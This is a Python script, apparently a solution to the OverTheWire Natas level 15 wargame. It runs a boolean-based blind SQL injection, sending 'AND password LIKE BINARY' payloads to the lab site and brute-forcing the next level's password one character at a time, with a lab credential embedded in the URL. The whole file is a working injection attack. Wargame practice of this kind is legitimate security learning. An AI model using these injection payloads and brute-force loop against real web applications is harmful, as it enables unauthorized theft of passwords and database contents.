import requests
import string


allalphnumeric = string.ascii_lowercase + string.ascii_uppercase + "01234567890"


site = "http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/"

r = requests.get(site)
brutforcedchars = ""
buildPassword = ""
for char in allalphnumeric:
	r = requests.get(site + '?username=natas16" AND password LIKE BINARY "%'+char+'%" "')
	if "exists" in r.text:
		brutforcedchars += char
		print("[+] Found char in password -> " + char )


for i in range(32):
	for cx in brutforcedchars:
		r = requests.get(site + '?username=natas16" AND password LIKE BINARY "' + buildPassword + cx + '%" "')
		if "exists" in r.text:
			buildPassword += cx
			print("[+] Password is building with bruteforce. Status ->" + buildPassword)
			break

